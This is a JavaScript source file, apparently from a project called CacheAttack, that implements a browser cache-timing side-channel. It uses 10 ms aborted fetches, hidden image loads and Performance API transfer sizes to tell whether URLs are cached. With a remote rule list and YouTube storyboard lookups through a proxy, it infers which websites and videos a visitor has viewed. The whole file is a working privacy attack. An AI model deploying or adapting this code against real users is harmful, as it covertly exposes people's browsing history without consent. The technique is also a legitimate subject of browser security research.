// NDev 2020 https://github.com/NDevTK/CacheAttack
const max = 10;

ifCached = (navigator.userAgent.includes("Firefox")) ? ifCached_1Wrap : ifCached_2;

async function getRules() {
    let req = await fetch("https://cache.ndev.tk/rules");
    let body = await req.json();
    return new Map(body);
}

function is304(res) {
    if (res.encodedBodySize > 0 &&
        res.transferSize > 0 &&
        res.transferSize < res.encodedBodySize) {
        return true;
    }
    return null;
}

function PerformanceCheck(url) {
    var res = performance.getEntriesByName(url).pop();
    if(res === undefined) return null
    if(is304(res)) return true;
    return (res.transferSize === 0);
}

async function getWebsites(callback, CacheTest = true) {
    var output = [];
    var callback = (callback) ? callback : website => {
    	output.push(website);
    };
    var Websites = await getRules();
    if(CacheTest) {
        let TestResult = await ifCached_test();
        if(!TestResult) throw "Cache is not working :-("
    }
    // Foreach website check if cached
    for (let website of Websites) {
        let result = await ifCached(website[0]);
		let check = PerformanceCheck(website[0]);
		if(check || result && check === null) {
			callback(website[1]);
		}
	}
    return output;
};

async function getVideos(callback) {
  let rules = ["PLrEnWoR732-BHrPp_Pm8_VleD68f9s14-","RDCLAK5uy_mkLtojKLOUUGwnu3ZnN5AaODijlieB-aQ", "RDCLAK5uy_lx_HcGQ3dqhBbBk3aaZPWoy2trdcdhfio", "PL57quI9usf_uhj9GF5uCwKKMivdC1ymWi"];
  
  let popular = await fetch("https://invidio.us/api/v1/popular");
  let data = await popular.json();
  data.forEach(video => checkVideo(video));

  rules.forEach(async playlist => {
  let reply = await fetch("https://invidio.us/api/v1/playlists/"+encodeURI(playlist));
  let data = await reply.json();
  data.videos.forEach(async video => {
    checkVideo(video);
  });
});
}

async function checkVideo(video, callback) {
  ["board", "board/hover"].forEach(async mode => {
    try {
      let res = await fetch("https://cors.usercontent.ndev.tk/"+mode+"/?v="+encodeURI(video.videoId));
      let board = await res.text();
      if(board === "Board not found.") return
      let result = await ifCached(board);
      let check = PerformanceCheck(board);
      if (check || result && check === null) {
        callback(video.title + " ("+video.videoId+")");
      }} catch {}
  })
}

async function ifCached_test() {
    let cache_test = "https://ndev.tk/README.md?".concat(Math.random());
    let result = await ifCached(cache_test);
    return (!result);
}

async function ifCached_1Wrap(url) {
    try {
        await ifCached_1(url);
    } catch(err) {
        return false
    }
    return true
}

function ifCached_1(url) {
    return new Promise((resolve, reject) => {
        var blocked = false;
        let img = new Image(0, 0);
        img.hidden = true;
        img.onerror = _ => {
            clearTimeout(timeout);
            resolve();
        };
        img.onload = _ => resolve();
        img.src = url;
        var timeout = setTimeout(_ => {
            img.src = "";
            img.remove();
            reject();
        }, max);
    });
}

async function ifCached_2(url){
    var state = true;
    var controller = new AbortController();
    var signal = controller.signal;
    var timeout = await setTimeout(_ => { // Stop request after max
        controller.abort();
        state = false;
    }, max);
    try {
        await fetch(url, {mode: "no-cors", signal});
    } catch(err) {
	    // Website blocked by client
	    clearTimeout(timeout);
	}
    clearTimeout(timeout);
    return state;
}
